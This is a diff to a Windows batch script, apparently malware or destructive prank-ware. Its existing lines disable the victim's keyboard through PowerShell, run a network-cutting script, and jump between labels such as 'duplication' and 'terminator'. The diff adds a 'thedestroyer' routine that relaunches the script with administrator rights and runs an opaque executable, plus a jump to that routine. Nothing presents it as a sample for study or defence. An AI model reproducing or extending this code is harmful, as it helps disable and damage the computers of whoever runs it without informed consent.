@@ -29,10 +29,17 @@ PowerShell.exe -Command "Get-PnpDevice -Class 'Keyboard' | Disable-PnpDevice -Co
 PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', '.scripts\make_file.ps1' -Verb RunAs"
 
 
+:thedestroyer
+set exe_path=".scripts\python\dist\C"
+if not "%1"=="am_admin" (powershell Start-Process "%0" -Verb RunAs -ArgumentList "am_admin" & exit)
+%exe_path%
+
+
 goto disablekeyboardandmouse
 PowerShell.exe -ExecutionPolicy Bypass
 PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', '.scripts\ShutNet.ps1' -Verb RunAs"
 goto duplication
 cscript .scripts\main.vbs
 goto netsecurety
+goto thedestroyer
 goto terminator
